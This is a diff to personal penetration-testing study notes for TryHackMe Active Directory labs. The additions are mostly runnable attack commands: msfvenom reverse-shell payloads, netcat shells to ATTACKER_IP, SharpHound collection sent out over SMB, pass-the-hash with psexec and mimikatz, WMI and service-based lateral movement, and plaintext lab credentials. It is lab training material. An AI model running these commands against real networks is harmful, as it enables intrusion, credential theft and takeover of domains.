@@ -388,6 +388,39 @@ here , "randomname" is just a random name given , and can give any username and 
 authentication required as some servers so not accept without auth
 
 -----
+
+### <span style="color:rgb(11, 142, 224)">Windows → Kali Linux (AD lab is to use an authenticated SMB share)</span>
+
+#### On Kali
+
+Create a folder:
+
+```
+mkdir -p ~/bloodhound-share
+```
+
+Start the SMB server:
+
+```
+sudo impacket-smbserver share ~/bloodhound-share -smb2support -username labuser -password LabPassword123
+```
+
+Leave that terminal running.
+
+#### On the Windows AD machine
+
+Connect to it:
+
+```
+net use \\10.150.71.44\share /user:labuser LabPassword123
+```
+
+Then copy:
+
+```
+copy 20261008121652_BloodHound.zip \\10.150.71.44\share\
+```
+
 ### <span style="color:rgb(11, 142, 224)">Netcat (to get shell back on kali and not use windows rdp): </span>
 
 Download 64 bit netcat : 
@@ -435,6 +468,11 @@ nc -lvnp 4444 > filename           # receiver
 
 
 # <span style="color:rgb(11, 142, 224)">Reverse Shells : </span>
+
+==🔵Listener : ==
+```
+rlwrap -cAr nc -lvnp 4444
+```
 
 <span style="color:rgb(11, 142, 224)">if we didn't wanted a call back to our listener using a reverse shell<br>we could have gotten system in same shell as well</span>
 ```
@@ -2682,7 +2720,7 @@ we get a reverse shel back as nt authority\system
 
 # ==🔵Active Directory==
 
-#### ==🟡Methodology : ==
+#### ==🟢Methodology : ==
 
 AD -> use nxc to find shares, winrm, rdp rights. Get a foothold and set up ligolo. Run bloodhound, check for any outgoing rights, kerberoast, asrep roast, look for sus files that may contain credentials. If nothing, try windows priv esc, if nothing look at other services, maybe a FTP, MSSQL, MySQL or something and see if theres any low hanging fruits. Rinse and repeat till youre DC.
 
@@ -2711,7 +2749,7 @@ xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-si
 ```
 Enter the password when prompted.
 
-### ==🟢Authentication==
+### ==🟢Authentication : ==
 
 ##### <span style="color:rgb(11, 142, 224)">Responder - LLMNR/NBT-NS/mDNS Poisoner and Rogue Authentication Servers</span>
 
@@ -2870,24 +2908,24 @@ https://github.com/funoverip/mcafee-sitelist-pwd-decryption
 python3 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
 ```
 
-### ==🟢Enumeration==
+### ==🟢Enumeration : ==
 
-##### ==🔵Runas (login to network)==
+#### ==🔵Runas (login to network)==
 ```
 runas.exe /netonly /user:<domain>\<username> cmd.exe
 ```
-##### ==🔵Enumerate contents of SYSVOL since there may be some additional AD credentials lurking there.==
+#### ==🔵Enumerate contents of SYSVOL since there may be some additional AD credentials lurking there.==
 ```
 dir \\za.tryhackme.com\SYSVOL\
 ```
 
-##### ==🔵Task manager : ==
+#### ==🔵Task manager : ==
 1. go to task manager 
 2. click on more details 
 3. click on users
 here will find which all additional users are logged into this machine 
 
-##### ==🔵Microsoft Management Console (GUI/RDP  access required)==
+#### ==🔵Microsoft Management Console (GUI/RDP  access required)==
 
 steps to install the Snap-Ins: (skip this step if mmc opens directly in the next step)
 1. Press **Start**
@@ -2923,7 +2961,7 @@ We can also use MMC to find hosts in the environment. If we click on either Serv
 
 If we had the relevant permissions, we could also use MMC to directly make changes to AD, such as changing the user's password or adding an account to a specific group.
 
-##### ==🔵Command Prompt==
+#### ==🔵Command Prompt==
 
 ###### Users
 
@@ -2965,7 +3003,7 @@ Drawbacks :
 - The `net` commands must be executed from a domain-joined machine. If the machine is not domain-joined, it will default to the WORKGROUP domain.
 - The `net` commands may not show all information. For example, if a user is a member of more than ten groups, not all of these groups will be shown in the output.
 
-##### ==🔵PowerShell==
+#### ==🔵PowerShell==
 
 switch to power shell first
 ```
@@ -2986,7 +3024,7 @@ Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Tab
 
 enumerate AD groups: 
 ```
-Get-ADGroup -Identity Administrators -Server za.tryhackme.com
+Get-ADGroup -Identity Administrators -Server za.tryhackme.com -Properties *
 ```
 
 enumerate group membership : 
@@ -2995,21 +3033,406 @@ Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com
 ```
 ###### AD Objects
 
-## Highlight colors
+all AD objects that were changed after a specific date: 
+```
+$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
+# make date to our format first
+```
 
-Bring color to your notes with six highlight colors.
-- Add a color emoji (🔴, 🟠, 🟡, 🟢, 🔵, 🟣) at the start of a highlight, or choose a color from the formatting menu.
-- Typing `==` in the editor now suggests highlight colors.
-- Live Preview: When the cursor overlaps a highlight, an inline swatch now appears. Click it to quickly change the highlight color.
+```
+Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
+```
 
+If we wanted to perform a password spraying attack without locking out accounts (account which lockout after few attempts)
+we can use this to enumerate accounts that have a badPwdCount that is greater than 0, to avoid these accounts in our attack:
+so we exclude these accounts
+```
+Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
+```
 
 ###### Domains
 
-
+retrieve additional information about the specific domain:
+```
+Get-ADDomain -Server za.tryhackme.com
+```
+info about : container used to store deleted AD objects
 
 ###### Altering AD Objects
 
+force changing the password of our AD user : 
+```
+Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
+```
+Remember to change the identity value and password for the account you were provided with for enumeration
 
+#### ==🔵Bloodhound==
 
+###### Setup : 
 
+sharp hound is data collector ; should be on widows machine
+bloodhound is data visualizer ; should be on attacker machine
+
+Download bloodhound from : Source code (zip) : https://github.com/SpecterOps/BloodHound/releases
+Download Sharphound from : SharpHound_v2.17.0_windows_x86.zip : https://github.com/SpecterOps/SharpHound/releases
+###### Sharp hound install and run : 
+
+transfer sharphound to windows : 
+```
+python3 -m http.server 8000
+certutil -f -urlcache http://10.150.71.44:8000/SharpHound.exe SharpHound.exe
+```
+run sharphound 
+```
+SharpHound.exe --CollectionMethods all --Domain za.tryhackme.com --ExcludeDCs
+```
+
+now transfer the results from sharphound back to linux using smb with authentication : 
+On Kali Create a folder:
+```
+mkdir -p ~/bloodhound-share
+```
+Start the SMB server:
+```
+sudo impacket-smbserver share ~/bloodhound-share -smb2support -username labuser -password LabPassword123
+```
+Leave that terminal running.
+On the Windows AD machine
+Connect to it:
+```
+net use \\10.150.71.44\share /user:labuser LabPassword123
+```
+Then copy:
+```
+copy 20261008121652_BloodHound.zip \\10.150.71.44\share\
+```
+###### blood hound install and run : 
+
+Install BloodHound
+
+On Kali:
+```
+sudo apt update
+sudo apt install -y bloodhound
+```
+Then run the setup:
+```
+sudo bloodhound-setup
+```
+Follow the prompts. It will set up the required database components.
+###### Start BloodHound
+
+```
+sudo bloodhound-start
+```
+Then launch:
+```
+bloodhound
+```
+###### If error : 
+
+if `PostgreSQL collation mismatch` error : 
+run:
+```
+sudo -u postgres psql -d postgres
+```
+At the PostgreSQL prompt:
+```
+ALTER DATABASE template1 REFRESH COLLATION VERSION;
+ALTER DATABASE postgres REFRESH COLLATION VERSION;
+\q
+```
+Then rerun:
+```
+sudo bloodhound-setup
+```
+
+###### Neo4j login : 
+
+You'll see the Neo4j login.
+Use:
+```
+Username: neo4j
+Password: neo4j
+```
+Neo4j will then force you to choose a **new password**.
+
+Choose one and remember it.
+ex. 
+```
+neo5j
+```
+###### Update BloodHound's Neo4j password
+
+The setup output specifically tells you:
+```
+update /etc/bhapi/bhapi.json
+```
+
+Open it:
+```
+sudo nano /etc/bhapi/bhapi.json
+```
+
+Change only the Neo4j `"secret"` value to the **new password you created in the Neo4j browser**.
+with the **new password you just created**.
+Save:
+```
+Ctrl + O
+Enter
+Ctrl + X
+```
+###### Start BloodHound
+
+```
+sudo bloodhound-start
+```
+
+If the launcher doesn't automatically open the interface, check:
+```
+bloodhound
+```
+
+Log in with the default BloodHound account
+```
+Email Address: admin
+Password: admin
+```
+
+Then import your SharpHound ZIP
+You already have:
+```
+20261008121652_BloodHound.zip
+```
+
+### ==🟢Lateral Movement and Pivoting : ==
+
+#### ==🔵Remotely Creating Services Using sc==
+
+##### Step 1 : create a reverse shell
+
+back on kali create a service binary 
+```
+msfvenom -p windows/x64/shell_reverse_tcp -f exe-service LHOST=10.150.74.24 LPORT=4444 -o testservice.exe
+```
+now start listener on kali 
+```
+rlwrap -cAr nc -lvnp 4444
+```
+
+##### Step 2 : login to initial user which we have credentials of
+
+Assumed breach scenario , we have got credentials of a normal user
+ex. 
+```
+user : damien.horton@thmjmp2.za.tryhackme.com
+password : pABqHYKsG8L7
+```
+connect to the user via SSH:
+```
+ssh za\\damien.horton@thmjmp2.za.tryhackme.com
+```
+
+##### Step 3 : Upload our reverse shell to the another user who has administrative access :
+
+We will use `t1_leonard.summers` credentials to upload our payload to the ADMIN$ share of THMIIS using smbclient from our kali:
+```
+smbclient -c 'put testservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' <password>
+```
+
+`ADMIN$` = `C:Windows\`
+##### Step 4 :  spawn a new shell with the other user's access token : 
+
+so that we can execute the reverse shell uploaded there
+
+upload net cat to the other user
+```
+smbclient -c 'put nc64.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' <2nd user password>
+```
+
+first start second listener on kali (with a different port than we did for our reverse shell)
+```
+rlwrap -cAr nc -lvnp 4443
+```
+
+from the first user shell , execute :
+```
+runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
+```
+it will ask for password , enter it of the second user
+
+We can receive the reverse shell connection using nc in our kali with the shell of second user
+it wont show the name though when `whoami` is used
+##### Step 5  : create a service on the 2nd user which will execute our reverse shell
+
+on the new 2nd user shell : 
+change the reverse shell name which you uploaded
+```
+sc.exe \\thmiis.za.tryhackme.com create THMservice-11112 binPath= "%windir%\testservice2.exe" start= auto
+```
+
+now we start the service 
+```
+sc.exe \\thmiis.za.tryhackme.com start THMservice-11112
+```
+we get a reverse shell back 
+
+#### ==🔵(imp)PsExec - Pass the Hash (create service)==
+
+from the password you got of the other user , make the nt hash of it
+
+create python script for it 
+```
+nano nthash.py
+```
+paste : 
+```
+from impacket.ntlm import compute_nthash
+
+password = input("Password: ")
+print(compute_nthash(password).hex())
+```
+save and exit 
+run : 
+```
+python3 nthash.py
+```
+Enter the password when prompted.
+
+```
+impacket-psexec ZA/t1_leonard.summers@thmiis.za.tryhackme.com -hashes :<generated hash>
+```
+we get reverse shell
+#### ==🔵Moving Laterally Using WMI
+
+##### Step 1 : create a reverse shell
+
+back on kali create a service binary 
+```
+msfvenom -p windows/x64/shell_reverse_tcp -f msi LHOST=10.150.74.24 LPORT=4444 -o myinstaller.msi
+```
+now start listener on kali 
+```
+rlwrap -cAr nc -lvnp 4444
+```
+
+##### Step 2 : login to initial user which we have credentials of
+
+Assumed breach scenario , we have got credentials of a normal user
+ex. 
+```
+user : damien.horton@thmjmp2.za.tryhackme.com
+password : pABqHYKsG8L7
+```
+connect to the user via SSH:
+```
+ssh za\\damien.horton@thmjmp2.za.tryhackme.com
+```
+##### Step 3 : Upload our reverse shell to the another user who has administrative access :
+
+We will use `t1_corine.waters` credentials to upload our payload to the ADMIN$ share of THMIIS using smbclient from our kali:
+```
+smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' <password of 2nd user>
+```
+
+`ADMIN$` = `C:Windows\
+##### Step 4 :  spawn a new shell with the other user's access token : 
+
+so that we can execute the reverse shell uploaded there
+
+upload net cat to the other user
+```
+smbclient -c 'put nc64.exe' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' <2nd user password>
+```
+
+first start second listener on kali (with a different port than we did for our reverse shell)
+```
+rlwrap -cAr nc -lvnp 4443
+```
+
+from the first user shell , execute :
+```
+runas /netonly /user:ZA.TRYHACKME.COM\t1_corine.waters "c:\tools\nc64.exe -e cmd.exe 10.150.74.24 4443"
+```
+it will ask for password , enter it of the second user i.e `Korine.1994`
+
+We can receive the reverse shell connection using nc in our kali with the shell of second user
+it wont show the name though when `whoami` is used
+
+##### Step 5  : create the WMI session and install the MSI : 
+
+on the new 2nd user shell , start PowerShell:
+```
+powershell.exe
+```
+
+enter these commands 1 by 1 : 
+```shell-session
+$username = 't1_corine.waters';
+
+$password = 'Korine.1994';
+
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+
+$Opt = New-CimSessionOption -Protocol DCOM
+
+$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+
+#change the <reverseshell.msi> name here if different
+```
+we get our reverse shell back 
+
+#### ==🔵(imp)Mimikatz - Pass the Hash(dump hash from memory)==
+
+ssh into the intial user : 
+```
+ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
+```
+User: ZA.TRYHACKME.COM\t2_felicia.dean
+Password: iLov3THM!
+we have admin access on this account 
+
+start mimikatz
+```
+.\mimikatz.exe 
+```
+using this we can take out credentials , tickets from memory ; insert tickets into memory
+we can also dump credentials from SAM and LSASS
+
+enable the Windows debug privilege
+```
+mimikatz # privilege::debug
+```
+
+now to dump the logged in password : 
+```
+mimikatz # sekurlsa::logonPasswords
+```
+we get the NTLM hash from this for our required user
+
+start listener : 
+```
+rlwrap -cAr nc -lvnp 5555
+```
+
+now on the 1st user shell : 
+update username , attacker ip , ntlm hash ; check port
+upload net cat there if not present
+```shell-session
+mimikatz # sekurlsa::pth /user:<username> /domain:za.tryhackme.com /ntlm:<ntlm hash> /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
+```
+
+we get a reverse shell back
+now we run : 
+update the computer name you want access of
+```shell-session
+winrs.exe -r:THMIIS.za.tryhackme.com cmd
+```
+now we get the access of the user we used the NTLM hash of
+
+#### ==🔵Abusing User Behavior==
 
